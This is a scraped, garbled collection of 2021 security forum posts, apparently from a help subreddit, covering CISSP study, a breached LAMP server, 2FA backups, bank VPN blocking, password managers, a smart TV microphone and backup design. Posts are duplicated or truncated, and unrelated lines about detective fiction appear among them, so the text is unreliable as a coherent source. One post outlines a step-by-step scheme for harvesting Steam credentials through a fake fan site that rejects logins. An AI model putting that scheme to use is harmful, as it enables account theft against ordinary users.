I am sure there were some more sources that I used, but these were the primary sources.  My biggest advice, don't just take practice tests and questions over and over.  They are helpful, but way more helpful when you understand WHY the answers are the actual answers.

Good Luck to everyone!",2021-06-29

I studied for a few months, got employed, and postponed the exam... a big mistake. So I got unemployed again last May, been studying for the test and will be taking it next week.

3323,o9m7p4,1st Attempt: Passed at Q101 ~100 minutes,"Morning All - 

Took and passed the CISSP this morning on my first attempt. If I can pass it on my first attempt, then any of you can. It took me around 100 minutes and 101 questions.

Like many have posted here before, the exam provided many challenging questions, and it felt like I was in the ring with Mike Tyson for 12 rounds. When the screen went blank after Q101 I was pretty nervous that I failed, because I did not feel that I was doing THAT well. However, I passed. Below is a little about me and how I prepared.

Of Note: It is key to remember that there are ""Developmental Questions"" embedded. Seeing those provided some challenges, but if you see some questions out of the ordinary or seem like content you did not see in your studies, do not worry. Additionally, I took the approach of the CAT is here to help. It is here to keep you from failing by providing questions to keep you at/near a passing score. I believe that mentally helped significantly.

# Relevant background:

* **BSc in Computer Science** from the University of Manchester
* 5 yrs at **Cisco** working on threat intelligence
* 1 yr at **CyberArk** as Security PMO for R&D
* 1 yr at **Deloitte** as a Senior Cybersecurity Consultant
* 2 yrs at **Microsoft** as a Senior Content Developer for Azure security products

I started looking into CISSP in my time at CyberArk but only really kicked off my proper studying 8 months ago.

# Resources I used:

|Resource|Format/location|Notes|
|:-|:-|:-|
|How To Think Like A Manager for the CISSP Exam (Ahmed, Luke)|Kindle edition|Read cover to cover. I found the advice and framing very helpful. (8/10)|
|CISSP Official Study Guide, 8th edition |Physical book|Read first 100 pages then used as reference. I found the style a little dry, the size intimidating, and the content occasionally lacking - a few times I came to this subreddit in frustration about missing topics. (6/10)|
|CISSP Official Study Guide, 8th edition |Digital edition (via [oreilly.com](https://oreilly.com))|This was where I consumed more of the OSG and a full-text search of a book is SO much more useful than an index which only has partial coverage. (7/10) |
|Eleventh Hour CISSP, 3rd Edition |Audio book|Listened all the way through twice. (7/10) |
|CISSP Course by Shon Harris |Videos (via [oreilly.com](https://oreilly.com)) |I found it insufferable how she began EVERY SINGLE short video with the word 'Now'. Couldn't listen after I noticed this behavioural tic. (1/10) |
|CISSP, Second Edition by Sari Greene|Videos (via [oreilly.com](https://oreilly.com)) |She suffers from the same verbal tic as Shon Harris: an overreliance on the word ""Now"" as a way to start a sentence or segway between ideas. It's really annoying after a very short time and so I had to quit after lesson 6. She also can't say ""hierarchical"" (but repeatedly does so, leaving out the second 'c'). (3/10) |
|Kelly Handerhan's cybrary course |Cybrary|Excellent. (8/10) |
|Destination Certification's Mind Map series|YouTube|As others have said, I don't know how/why these are free. But they're freaking awesome. I took a week of study leave before the exam and these were the core part of that week. (10/10) |

|[CISSPREP.net](https://CISSPREP.net) practice exams |[CISSPREP.net](https://CISSPREP.net)|Really useful. I took 3 of the 1 hr exams. (8/10)|
|Larry Greenblatt's ""CISSP 2020 Exam Tips""|YouTube|Superb! Watched this on the day of the exam and it really helped solidify the mindset. (10/10)|
|Darknet Diaries |Podcast by Jack Rhysider |Jack's got an interesting way of presenting stories and they're often a good application of the issues covered in the study material. Occasionally, he comes across as a little *too* disappointed that the criminals he's covering get punished. (7/10)|

# Thoughts on the value of this whole process:

I've read a lot of negativity about the cert. Plenty of people (including current CISSP holders) who really don't think it's worth the paper it's printed on. At times, it certainly feels more like a money-making operation than a real 'test' of your knowledge. The annual fee of $125 also feels very steep, and unrelated to the goals. The fact that it's payable in the first year when they've already had $700 for the exam also feels pretty unreasonable.

I wasn't impressed with the quality of the questions in the exam. One in particular had a typo that enormously impacted the meaning of the question. I can't go into details, but the way it was written made no sense and I had to infer the intention. I noted it for reporting afterwards but I was too pumped up from the end of the test to actually do anything on the day. 

So now I have my provisional pass, and I'll have to pay my annual subs, and the exam scraped the surface of my knowledge, but was it worth it? I genuinely think I'll only be able to answer that with the benefit of hindsight a few years from now.",2021-06-27

3333,oi3wll,Is it a good idea to use 1 email address per company you interact with?,"My email was leaked, so of course I started getting massive amounts of spam. I also got a new type of spam: subscription spam, which is where bots sign you up for 100s of newsletters that don't have captchas or anything. Newsletters are much less likely to be auto marked as spam so they often go straight to inbox.

Anyway that email address nearly unusable until I spent a bunch of time cleaning it up. This got me wishing I could've just dumped the email address and moved on (I couldn't do that since it was tied to too many things).  Imagine if I could have just updated the email address on 1 website- problem solved. That also helps security, I think-- if someone steals one of your email accounts, the worst they can do is log into 1 company.

The main problem I can see with this approach is that it is kind of difficult to maintain dozens of email addresses. I'm pretty sure Google auto deletes gmail accounts after 1-2 years of you not logging in. So you'd need to manually log into each email address occasionally. Also if you are talking to customer service and they ask you for your email address, you might not be able to remember unless you follow an obvious naming convention.

3343,omwnv0,Having a hard time investigating/recovering from server hack," Hi everyone. For context: I'm a sysadmin with a decent understanding of offensive hacking, and I run a few LAMP servers on DigitalOcean for personal niche websites and a few clients' websites. A couple months ago I put all my domains on a bug bounty (openbugbounty org) to help me identify weaknesses as I continue growing. (I've had only minor exploits mentioned, and most of the researchers violate the rules I wrote, ie. dont attack subdomains, don't report self-xss, etc ). Since this started, I would occasionally see my MYSQL server drop, maybe twice a month. I would reboot my server and all would be well (in retrospect I see how dumb this attitude was). I've also begun getting a TON of log traffic, as one would expect.

Here's where I make a huge embarrassing mistake; I decided to use my main production server to host the development environment for a new version of a CMS I wrote in PHP/MySQL. I was working on dev(.)mysite(.)com, which was on the same server as mysite(.)com, and used the same MySQL server. I really can't explain my thinking on this one. At my 9-5 I'm very strict about having the developers keep dev and production environments separate, so this is out of character for me. I guess my level of security-consciousness is proportional to the amount of explaining I'll have to do.

About a week or ago I find my CMS won't allow me to login. I checked the DB and there are hundreds and hundreds of new entries in the *users* table. Interestingly, the user account I was trying to login with looked untouched. I obviously got caught slipping with a SQLi vulnerability. No other tables were affected that I know of, as this CMS uses an un-privileged DB account. I shut the dev site down, and moved it to a local LAMP server on my home network. Better late than never. Now I'm trying to figure out what happened, and how far the breach went.

I have over 1,000 log files in /var/log/apache2, and most other directories in /var/log/ are also packed to the gills. There's too much noise (presumably) from the bug bounty for me to analyze anything. I spent a day writing python scripts to analyze stuff. I have one that compiles all website-specific logs into respective master files, and runs scalp.py on them, outputting everything to an HTML file I can navigate. There's so many random injection attempts that the script is almost useless to me. I wrote another script to analyze the /var/log/auth.log file and at least count and sort the types of messages. The output can be found [https://pastebin.com/grGhT0Qx](https://pastebin.com/grGhT0Qx) . Sorry if the output is confusing, I don’t understand what a lot of the messages mean, so just did a basic count for now.

I only saw on single SSH login that I didn't recognize, and it was on the account smmsp. This also lead me to see in my mail log files that somebody had found an old forum install I forgot about, and had been using it to send massive amounts of spam emails to email addresses in Russia. I've removed the account, the forum, and uninstalled sendmail.

I'm at the point of the investigation where I risk going down the wrong path and wasting valuable time.

So here’s my questions:

1. Are there any programs that will do an in-depth audit of my logs? I did a bunch of searching, but almost nothing fits the bill besides scalp.py, and that’s only for website-specific log files. I’m more than happy to expand my own scripts to do this if I need to, but would request someone push me in the direction of the information I need to start studying.
2. Is there an application that could blacklist an IP address if it recognizes injection attempts? I’m sure a WAF could pull something like this off, but have never used any so I would be swinging in the dark by picking one. I can write a script to do it too, using the logs to identify IPs, but is there a specific method of blacklisting that I should be leaning towards if I need to do this on my own?

Thanks a ton for any responses/advice. I know this is a long, dry read.",2021-07-18
3344,p8agjm,2FA fallback solutions while traveling in case of lost device?,"I'm looking to travel for quite a while, and am looking for ways to be able to easily restore access to all of my services if a phone is stolen.

Main concerns:

2. any sites using 2FA with an authenticator app (google authenticator, authy, etc), will leave me stuck without my phone

What would you consider best practice to handle this, particularly if you have to travel where it would be awkward to carry backup paper QR codes/etc. Also feel like it would be risky to carry around QR codes like that.

Some thoughts:

- I just ordered 2 yubikeys, but not all sites support these where I can get totally locked out
- I could buy a cheap android phone, and regenerate 2FA QR codes on all sites that I use them, and setup both my primary iPhone and backup Android authenticator apps to have the OTP's available

It's popular today for people to set their whodunnit mysteries back in the interwar period when Golden Age mystery fiction was written, or even earlier.

3367,ojr8ka,Banks Blocking Anonymous VPN Providers and Fraud Question,"Hi everyone.

I noticed banks are increasing the blocking of anonymizer VPN providers to deter fraud. When connecting from a VPN, the bank may block the login attempt, prompt the login process with a security question/answer, or in some more extreme cases, disable or close the account requiring the affected user to go into a branch to verify their identity with bank staff. 

I understand why this is occurring with the increased fraud. However, my question is, what are the back-end providers banks are using to monitor for, detect, and prevent log-on from VPN providers?

Google research suggests several banks and financial providers use a company called Maxmind ([https://www.maxmind.com/en/home](https://www.maxmind.com/en/home)). 

Does anyone know of any other back-end providers used to detect fraud during the log-on process?

3370,oc5jlt,Never Seen Anyone Report this Security Flaw in the Last 40 Years?,"(Note this is an edit, to hopefully better explain what I was talking about here).

Phishing is very common, and not only that, very easy to detect.   Someone sends you an email that attempts to get you to click a link that will send you to a site that looks like the login screen for a popular site like Ebay, Amazon, Microsoft, etc.

What I have never seen discussed very often at all in the last 40 years or talked about is another possible security flaw.   What if someone purposely sets up a real website.   Key word is real.   Not a phish, not a fake, not a copy of a popular site.   Instead they set up a real site and this site is run by a hacker or a group of hackers.

A  hacker could use this trick:  They create a legitimate website.   Say a  computer gaming website.   They require people to create an account to  access the website, where people have to enter an email and a password.    They delete or edit the password file, so that people trying to login,  will see, your password is incorrect and get a message ""try again"".     So someone trying to login to the legitimate website, will ""cycle thru  all their passwords"".

A possible ""real"" scenario of someone trying this:    For example, if you want to hack into Steam accounts, this is how I would do it:   1st) Get a list of upcoming planned to be released games on Steam,  2nd) Check for a soon to be released game where there are no fan websites yet,   3rd) Create a fan website for the upcoming to be released game  (prior to the games release date),    4th) Make sure you require people to create an account to use your fan site, 5th) Now after the game is released, people buy it and may search for information on how to play the game, and they will go to your site and type in an email and password to create their account, 6th) You as the hacker and site administrator, do what I suggested in the paragraph prior to this one.

This is just an example scenario.   The security flaw, is that phishing is VERY easy to detect, but how would you know if your favorite site  (think of any site you visit every day), is actually being run by a hacker or group of hackers?     Maybe when you go to search for information on the game that you just purchased, that site is being run by a hacker.

Phishing is very easily detectable.   But how would you detect if it is actually a real site?   How would you know that this real site is being run by a hacker or group of hackers?    This is the crux of the matter and where there is some security risk if people don't consider this could happen.",2021-07-02

- I just ordered 2 yubikeys, but not all sites support these where I can get totally locked out
- I could buy a cheap android phone, and regenerate 2FA QR codes on all sites that I use them, and setup both my primary iPhone and backup Android authenticator apps to have the OTP's available

3401,omwnv0,Having a hard time investigating/recovering from server hack," Hi everyone. For context: I'm a sysadmin with a decent understanding of offensive hacking, and I run a few LAMP servers on DigitalOcean for personal niche websites and a few clients' websites. A couple months ago I put all my domains on a bug bounty (openbugbounty org) to help me identify weaknesses as I continue growing. (I've had only minor exploits mentioned, and most of the researchers violate the rules I wrote, ie. dont attack subdomains, don't report self-xss, etc ). Since this started, I would occasionally see my MYSQL server drop, maybe twice a month. I would reboot my server and all would be well (in retrospect I see how dumb this attitude was). I've also begun getting a TON of log traffic, as one would expect.

Here's where I make a huge embarrassing mistake; I decided to use my main production server to host the development environment for a new version of a CMS I wrote in PHP/MySQL. I was working on dev(.)mysite(.)com, which was on the same server as mysite(.)com, and used the same MySQL server. I really can't explain my thinking on this one. At my 9-5 I'm very strict about having the developers keep dev and production environments separate, so this is out of character for me. I guess my level of security-consciousness is proportional to the amount of explaining I'll have to do.

About a week or ago I find my CMS won't allow me to login. I checked the DB and there are hundreds and hundreds of new entries in the *users* table. Interestingly, the user account I was trying to login with looked untouched. I obviously got caught slipping with a SQLi vulnerability. No other tables were affected that I know of, as this CMS uses an un-privileged DB account. I shut the dev site down, and moved it to a local LAMP server on my home network. Better late than never. Now I'm trying to figure out what happened, and how far the breach went.

I have over 1,000 log files in /var/log/apache2, and most other directories in /var/log/ are also packed to the gills. There's too much noise (presumably) from the bug bounty for me to analyze anything. I spent a day writing python scripts to analyze stuff. I have one that compiles all website-specific logs into respective master files, and runs scalp.py on them, outputting everything to an HTML file I can navigate. There's so many random injection attempts that the script is almost useless to me. I wrote another script to analyze the /var/log/auth.log file and at least count and sort the types of messages. The output can be found [https://pastebin.com/grGhT0Qx](https://pastebin.com/grGhT0Qx) . Sorry if the output is confusing, I don’t understand what a lot of the messages mean, so just did a basic count for now.

I only saw on single SSH login that I didn't recognize, and it was on the account smmsp. This also lead me to see in my mail log files that somebody had found an old forum install I forgot about, and had been using it to send massive amounts of spam emails to email addresses in Russia. I've removed the account, the forum, and uninstalled sendmail.

I'm at the point of the investigation where I risk going down the wrong path and wasting valuable time.

So here’s my questions:

1. Are there any programs that will do an in-depth audit of my logs? I did a bunch of searching, but almost nothing fits the bill besides scalp.py, and that’s only for website-specific log files. I’m more than happy to expand my own scripts to do this if I need to, but would request someone push me in the direction of the information I need to start studying.
2. Is there an application that could blacklist an IP address if it recognizes injection attempts? I’m sure a WAF could pull something like this off, but have never used any so I would be swinging in the dark by picking one. I can write a script to do it too, using the logs to identify IPs, but is there a specific method of blacklisting that I should be leaning towards if I need to do this on my own?

3404,ojr8ka,Banks Blocking Anonymous VPN Providers and Fraud Question,"Hi everyone.

I noticed banks are increasing the blocking of anonymizer VPN providers to deter fraud. When connecting from a VPN, the bank may block the login attempt, prompt the login process with a security question/answer, or in some more extreme cases, disable or close the account requiring the affected user to go into a branch to verify their identity with bank staff. 

I understand why this is occurring with the increased fraud. However, my question is, what are the back-end providers banks are using to monitor for, detect, and prevent log-on from VPN providers?

Google research suggests several banks and financial providers use a company called Maxmind ([https://www.maxmind.com/en/home](https://www.maxmind.com/en/home)). 

Does anyone know of any other back-end providers used to detect fraud during the log-on process?

3408,oi3wll,Is it a good idea to use 1 email address per company you interact with?,"My email was leaked, so of course I started getting massive amounts of spam. I also got a new type of spam: subscription spam, which is where bots sign you up for 100s of newsletters that don't have captchas or anything. Newsletters are much less likely to be auto marked as spam so they often go straight to inbox.

Anyway that email address nearly unusable until I spent a bunch of time cleaning it up. This got me wishing I could've just dumped the email address and moved on (I couldn't do that since it was tied to too many things).  Imagine if I could have just updated the email address on 1 website- problem solved. That also helps security, I think-- if someone steals one of your email accounts, the worst they can do is log into 1 company.

The main problem I can see with this approach is that it is kind of difficult to maintain dozens of email addresses. I'm pretty sure Google auto deletes gmail accounts after 1-2 years of you not logging in. So you'd need to manually log into each email address occasionally. Also if you are talking to customer service and they ask you for your email address, you might not be able to remember unless you follow an obvious naming convention.

What do you think? Is there a better way?",2021-07-11

3415,oc5jlt,Never Seen Anyone Report this Security Flaw in the Last 40 Years?,"(Note this is an edit, to hopefully better explain what I was talking about here).

Phishing is very common, and not only that, very easy to detect.   Someone sends you an email that attempts to get you to click a link that will send you to a site that looks like the login screen for a popular site like Ebay, Amazon, Microsoft, etc.

What I have never seen discussed very often at all in the last 40 years or talked about is another possible security flaw.   What if someone purposely sets up a real website.   Key word is real.   Not a phish, not a fake, not a copy of a popular site.   Instead they set up a real site and this site is run by a hacker or a group of hackers.

A  hacker could use this trick:  They create a legitimate website.   Say a  computer gaming website.   They require people to create an account to  access the website, where people have to enter an email and a password.    They delete or edit the password file, so that people trying to login,  will see, your password is incorrect and get a message ""try again"".     So someone trying to login to the legitimate website, will ""cycle thru  all their passwords"".

A possible ""real"" scenario of someone trying this:    For example, if you want to hack into Steam accounts, this is how I would do it:   1st) Get a list of upcoming planned to be released games on Steam,  2nd) Check for a soon to be released game where there are no fan websites yet,   3rd) Create a fan website for the upcoming to be released game  (prior to the games release date),    4th) Make sure you require people to create an account to use your fan site, 5th) Now after the game is released, people buy it and may search for information on how to play the game, and they will go to your site and type in an email and password to create their account, 6th) You as the hacker and site administrator, do what I suggested in the paragraph prior to this one.

This is just an example scenario.   The security flaw, is that phishing is VERY easy to detect, but how would you know if your favorite site  (think of any site you visit every day), is actually being run by a hacker or group of hackers?     Maybe when you go to search for information on the game that you just purchased, that site is being run by a hacker.

Phishing is very easily detectable.   But how would you detect if it is actually a real site?   How would you know that this real site is being run by a hacker or group of hackers?    This is the crux of the matter and where there is some security risk if people don't consider this could happen.",2021-07-02

It's popular today for people to set their whodunnit mysteries back in the interwar period when Golden Age mystery fiction was written, or even earlier.

Further, readers nowadays are too far removed from Victorian society to notice that heroes like Sherlock Holmes were in fact introducing the audience to chemistry and forensics that was cutting-edge at the time.

3446,omwnv0,Having a hard time investigating/recovering from server hack," Hi everyone. For context: I'm a sysadmin with a decent understanding of offensive hacking, and I run a few LAMP servers on DigitalOcean for personal niche websites and a few clients' websites. A couple months ago I put all my domains on a bug bounty (openbugbounty org) to help me identify weaknesses as I continue growing. (I've had only minor exploits mentioned, and most of the researchers violate the rules I wrote, ie. dont attack subdomains, don't report self-xss, etc ). Since this started, I would occasionally see my MYSQL server drop, maybe twice a month. I would reboot my server and all would be well (in retrospect I see how dumb this attitude was). I've also begun getting a TON of log traffic, as one would expect.

Here's where I make a huge embarrassing mistake; I decided to use my main production server to host the development environment for a new version of a CMS I wrote in PHP/MySQL. I was working on dev(.)mysite(.)com, which was on the same server as mysite(.)com, and used the same MySQL server. I really can't explain my thinking on this one. At my 9-5 I'm very strict about having the developers keep dev and production environments separate, so this is out of character for me. I guess my level of security-consciousness is proportional to the amount of explaining I'll have to do.

About a week or ago I find my CMS won't allow me to login. I checked the DB and there are hundreds and hundreds of new entries in the *users* table. Interestingly, the user account I was trying to login with looked untouched. I obviously got caught slipping with a SQLi vulnerability. No other tables were affected that I know of, as this CMS uses an un-privileged DB account. I shut the dev site down, and moved it to a local LAMP server on my home network. Better late than never. Now I'm trying to figure out what happened, and how far the breach went.

I have over 1,000 log files in /var/log/apache2, and most other directories in /var/log/ are also packed to the gills. There's too much noise (presumably) from the bug bounty for me to analyze anything. I spent a day writing python scripts to analyze stuff. I have one that compiles all website-specific logs into respective master files, and runs scalp.py on them, outputting everything to an HTML file I can navigate. There's so many random injection attempts that the script is almost useless to me. I wrote another script to analyze the /var/log/auth.log file and at least count and sort the types of messages. The output can be found [https://pastebin.com/grGhT0Qx](https://pastebin.com/grGhT0Qx) . Sorry if the output is confusing, I don’t understand what a lot of the messages mean, so just did a basic count for now.

I only saw on single SSH login that I didn't recognize, and it was on the account smmsp. This also lead me to see in my mail log files that somebody had found an old forum install I forgot about, and had been using it to send massive amounts of spam emails to email addresses in Russia.

3449,ojr8ka,Banks Blocking Anonymous VPN Providers and Fraud Question,"Hi everyone.

I noticed banks are increasing the blocking of anonymizer VPN providers to deter fraud. When connecting from a VPN, the bank may block the login attempt, prompt the login process with a security question/answer, or in some more extreme cases, disable or close the account requiring the affected user to go into a branch to verify their identity with bank staff. 

I understand why this is occurring with the increased fraud. However, my question is, what are the back-end providers banks are using to monitor for, detect, and prevent log-on from VPN providers?

Google research suggests several banks and financial providers use a company called Maxmind ([https://www.maxmind.com/en/home](https://www.maxmind.com/en/home)). 

Does anyone know of any other back-end providers used to detect fraud during the log-on process?

3453,oi3wll,Is it a good idea to use 1 email address per company you interact with?,"My email was leaked, so of course I started getting massive amounts of spam. I also got a new type of spam: subscription spam, which is where bots sign you up for 100s of newsletters that don't have captchas or anything. Newsletters are much less likely to be auto marked as spam so they often go straight to inbox.

Anyway that email address nearly unusable until I spent a bunch of time cleaning it up. This got me wishing I could've just dumped the email address and moved on (I couldn't do that since it was tied to too many things).  Imagine if I could have just updated the email address on 1 website- problem solved. That also helps security, I think-- if someone steals one of your email accounts, the worst they can do is log into 1 company.

The main problem I can see with this approach is that it is kind of difficult to maintain dozens of email addresses. I'm pretty sure Google auto deletes gmail accounts after 1-2 years of you not logging in. So you'd need to manually log into each email address occasionally. Also if you are talking to customer service and they ask you for your email address, you might not be able to remember unless you follow an obvious naming convention.

3460,oc5jlt,Never Seen Anyone Report this Security Flaw in the Last 40 Years?,"(Note this is an edit, to hopefully better explain what I was talking about here).

Phishing is very common, and not only that, very easy to detect.   Someone sends you an email that attempts to get you to click a link that will send you to a site that looks like the login screen for a popular site like Ebay, Amazon, Microsoft, etc.

What I have never seen discussed very often at all in the last 40 years or talked about is another possible security flaw.   What if someone purposely sets up a real website.   Key word is real.   Not a phish, not a fake, not a copy of a popular site.   Instead they set up a real site and this site is run by a hacker or a group of hackers.

A  hacker could use this trick:  They create a legitimate website.   Say a  computer gaming website.   They require people to create an account to  access the website, where people have to enter an email and a password.    They delete or edit the password file, so that people trying to login,  will see, your password is incorrect and get a message ""try again"".     So someone trying to login to the legitimate website, will ""cycle thru  all their passwords"".

A possible ""real"" scenario of someone trying this:    For example, if you want to hack into Steam accounts, this is how I would do it:   1st) Get a list of upcoming planned to be released games on Steam,  2nd) Check for a soon to be released game where there are no fan websites yet,   3rd) Create a fan website for the upcoming to be released game  (prior to the games release date),    4th) Make sure you require people to create an account to use your fan site, 5th) Now after the game is released, people buy it and may search for information on how to play the game, and they will go to your site and type in an email and password to create their account, 6th) You as the hacker and site administrator, do what I suggested in the paragraph prior to this one.

This is just an example scenario.   The security flaw, is that phishing is VERY easy to detect, but how would you know if your favorite site  (think of any site you visit every day), is actually being run by a hacker or group of hackers?     Maybe when you go to search for information on the game that you just purchased, that site is being run by a hacker.

Phishing is very easily detectable.   But how would you detect if it is actually a real site?   How would you know that this real site is being run by a hacker or group of hackers?    This is the crux of the matter and where there is some security risk if people don't consider this could happen.",2021-07-02

3479,oc13pl,Password manager Windows Hello Integration,"Recently, I got really frustrated with trying to get enpass to work with Windows Hello. What I am seeking is not having to type my master password every time I restart the machine or enpass. For enpass, they apparently store a key in the TPM, but require TPM 2.0. However, this did not work in both of my TPM system because enpass said that they do not implement tpm key attestation properly. 

I tried Bitwarden and did not have this issue. However when I turn off Bitwarden, it still did not required me to enter the master password. This got me thinking about how each password manager handle encryption on windows and what are the pros and cons security-wise.

Here's what I notice so far from reading.

* 1password - integrates with windows hello, but does not store the key even if tpm is present. This mean when you restart 1password, you must enter master password. 1Password explain that unlike the Mac with their security enclave, there is no safe way of storing the master password key.
* Bitwarden - product can be unlock using windows hello. It probably stores the key on disk somewhere and is unlocked by windows hello. I am able to start up bitwarden and unlock it using windows hello even without tpm. 
* Dashlane - Integrates with windows Hello and does not talk about TPM requirements but apparently force you to enter the master password every 14 days as a safety measure.
* Enpass - Integrates with windows Hello and stores key in the TPM 2.0 but it has to implement TPM key attestation properly. IF this does not work, then users has to enter master password on enpass start up.
* Last Pass - does not appear to integrate with Hello but uses its own fingerprint integration. I don't think it uses TPM.

Enpass explain that on windows without TPM, you cannot safely store the master password key.  Bitwarden is mum on this. Is Enpass right though? Is storing the master password key without TPM unsafe?",2021-07-02
3480,p6xttl,"Are there any guidelines for how much weaker your passwords/PINs can afford to be when additional layers of protection (e.g. TPM, 2FA, key files, lockout thresholds, etc.) are present?","This might be a strange question, but I'm curious what this community thinks. In practice (I know that *in theory* every password you use should be long and complex), the strength of your passwords is dependent on what additional layers of protection are available, if any. Typically you'd feel less secure using, say, a fifteen character password as a master password, but might feel comfortable using that same fifteen character password for an online account protected by 2FA.

I'm wondering whether there are any loose guidelines for determining how much less secure/long/complex your passwords can afford to be when additional layers of protection are present. Personally, I need to remember at least five unique passwords. Some are very long diceware passwords, while others are substantially shorter and easier to remember. How much I'm willing to give up in terms of security in exchange for ease of use depends on whether those passwords stand completely alone without any additional layers of protection (as an example, the password I use to sign into my main cloud account is long and complex and 2FA isn't enabled - I wanted a scenario where I know I can always log into this account, even if I were to lose my phone and laptop at the same time or something else happened that made my 2FA codes unrecoverable).

I recently enabled Bitlocker drive encryption and would like to switch from using a local account password to a local PIN backed by TPM. Because two new layers of security have been introduced on my machine - the Bitlocker drive encryption and the TPM backing available to PINs - I was considering using something easier to type and remember as my PIN, since my current local account password is a pain to type. I feel like a PIN in this scenario can afford to be shorter and less complex because of that TPM backing and lockout threshold - I just don't know how much less secure.

I was initially led to believe that the only microphone was on the remote, which I could disable by turning Bluetooth off, as that is how the [audio is transmitted](https://www.sony.com/electronics/support/televisions-projectors-lcd-tvs-android-/xr-65x90j/articles/00171448). But after looking more closely at the [documentation](https://www.sony.co.in/electronics/support/televisions-projectors-lcd-tvs-android-/xr-55x90j/articles/00201366), I've realized that there is actually a mic on the TV itself, for ""hands-free voice controls"". While this is concerning, very few TVs in my budget have HDMI 2.1 support and a well-rated display, which are my main criteria.

There is a switch to turn the mic off, and of course I plan on disabling Google Assistant and configuring all of the privacy settings on the TV to my liking. But that's all software-related, and I've heard stories of microphones being turned on remotely, which disturbs me.

Here are some safety measures that I've thought of based on discussions I've read online:

* As I've said already, disabling the mic using the button and disabling all audio features
* Having a secure WiFi password that's unlikely to be cracked
* Attaching a Pi-Hole to the network? (I'm tech-savvy enough to make one and set it up, but I don't exactly know why it's necessary or how it would help, I've just seen it mentioned a bunch.)
* Making a separate Google account so that my voice isn't tied to my identity
* (Last resort, if it's still insecure): disabling WiFi, making it a ""dumb TV"" and using other devices for streaming (although I really would have liked to sideload Android apps without having to get an extra box)

Will these be enough? Is there anything else I should do? Are some of these unnecessary? Thanks for your input.",2021-07-30

For example, my mother's tablet stopped working, but she is technically still connected to Gmail and such. If someone somewhere somehow puts his hand on the tablet and manages to make it work, then he can gain access to everything, since they dont ask you for your password once logged in.

Another example, I was thinking of getting a cloud service (OneDrive) for me and my family. However, if someone steals our devices or we lose them somehow, because it connects us automatically, then it is leaving room for the stranger to steal informations or erasing everything, or even changing account securities in which we cannot get the account back.

Some constraints:

- I'm a full time backpacker with no home. If my things are lost/stolen, flying to a friend/relative to get my backup disk would cost too much money and the data might be too old. So I must use cloud to store my backups. 

- I don't trust any password managers, cloud providers, Apple, Google and such. Maybe they are nice today but I'm not sure what they or government would do 30 years later. I trust whatever I have control over; open source software that runs on my machine. 

Here's the design draft

> Pw0 for cloud1, cloud2
> 
> Pw0 for email account associated to clouds. Email account is created because cloud providers ask for it
> 
> Pw1 for vault1 - It has passwords, cards (purpose of separating v1 and v2 is to keep v1 usually locked)
> 
> Pw1 for vault2 - It has everything else 
> 
> Pw2 for encryption of zip file - I will access this from an untrusted computer/phone after my things are stolen. This device could belong to a hotel, stranger or police. It has things to help me prove my ID and access money to buy local clean phone and computer so I can access all vaults and continue my life as if nothing happened. Zip because I might not able to install the software to unlock a vault.
> 
> That's it. I just need to remember 3 passwords. Vaults and zip are encrypted and synced to clouds. First cloud works with Cryptomator and syncs instantly when there's connection. Second cloud works with an *alternative* to Cryptomator (in case of data corruption, Cryptomator software bug) and syncs *once a month* (in case instant sync fails and also kind of as an older backup). I don't remember needing versioning in backups in last 15 years. *Two clouds* because one's domain could be blocked by the local government or could lock me out or its software might fail to work when I need it to work.

> As for PW management: I use incognito browser, pay attention to SSL and domain, clear the clipboard after I copy paste a sensitive password. Using a PW manager software safely would increase complexity (gotta back that up too) and I'm not sure if I want that. I think I could keep a text file of bank, broker, government account passwords and credit card info in vault1. I'd enter passwords from computer screen to my phone manually.

I'm not trying to protect myself against the FBI and I'm not a public figure, though I earn online. I just want to protect myself enough to feel safe and relaxed, considering I am not rich, have no home, *carry all my possessions with me*, am fully reliant on internet and I'm on my own. 

Could I get your comment on this design? Is it good enough?

Some other questions:

- I don't have an alternative to Cryptomator yet. Any suggestions? 

- I'm a little worried about being dependent on terminal but, is there an idiot-proof simple script to encrypt and decrypt files individually? Or something with a GUI? Maybe something that would choose the right encryption algorithm when there's new vulnerabilities I wouldn't know about? Maybe I need two versions of this script instead of two softwares like Cryptomator.",2021-07-05

3508,p6xttl,"Are there any guidelines for how much weaker your passwords/PINs can afford to be when additional layers of protection (e.g. TPM, 2FA, key files, lockout thresholds, etc.) are present?","This might be a strange question, but I'm curious what this community thinks. In practice (I know that *in theory* every password you use should be long and complex), the strength of your passwords is dependent on what additional layers of protection are available, if any. Typically you'd feel less secure using, say, a fifteen character password as a master password, but might feel comfortable using that same fifteen character password for an online account protected by 2FA.

I'm wondering whether there are any loose guidelines for determining how much less secure/long/complex your passwords can afford to be when additional layers of protection are present. Personally, I need to remember at least five unique passwords. Some are very long diceware passwords, while others are substantially shorter and easier to remember. How much I'm willing to give up in terms of security in exchange for ease of use depends on whether those passwords stand completely alone without any additional layers of protection (as an example, the password I use to sign into my main cloud account is long and complex and 2FA isn't enabled - I wanted a scenario where I know I can always log into this account, even if I were to lose my phone and laptop at the same time or something else happened that made my 2FA codes unrecoverable).

I recently enabled Bitlocker drive encryption and would like to switch from using a local account password to a local PIN backed by TPM. Because two new layers of security have been introduced on my machine - the Bitlocker drive encryption and the TPM backing available to PINs - I was considering using something easier to type and remember as my PIN, since my current local account password is a pain to type. I feel like a PIN in this scenario can afford to be shorter and less complex because of that TPM backing and lockout threshold - I just don't know how much less secure.

As a forgetful person (why I haven't switched to YubiKey) with a crap memory who's always looking for ways to make things a little simpler, I'd love to hear what this community has to say on this matter.",2021-08-18

My bank uses their own IPhone app for OTP which is time-based and produces a 6-digit code. I am trying to migrate to my own Authenticator app on my Pinephone so I jailbroke my iphone and extracted the OTP data from the app that consists of:

\- Serial number as a 11-digit decimal number  
\- Activation code as a 4-digit decimal number

This doesn't appear to be in the standard format of TOTP or HOTP used by common OTP apps.

3533,oe9sx1,Is my `digital life design` good enough?,"Hi. I'm trying to organize my digital life and make it as simple as possible. I'm going to be really happy after I finalize this design. So I do appreciate your input. Especially if you are great at cyber security

Some constraints:

- I'm a full time backpacker with no home. If my things are lost/stolen, flying to a friend/relative to get my backup disk would cost too much money and the data might be too old. So I must use cloud to store my backups. 

- I don't trust any password managers, cloud providers, Apple, Google and such. Maybe they are nice today but I'm not sure what they or government would do 30 years later. I trust whatever I have control over; open source software that runs on my machine. 

Here's the design draft

> Pw0 for cloud1, cloud2
> 
> Pw0 for email account associated to clouds. Email account is created because cloud providers ask for it
> 
> Pw1 for vault1 - It has passwords, cards (purpose of separating v1 and v2 is to keep v1 usually locked)
> 
> Pw1 for vault2 - It has everything else 
> 
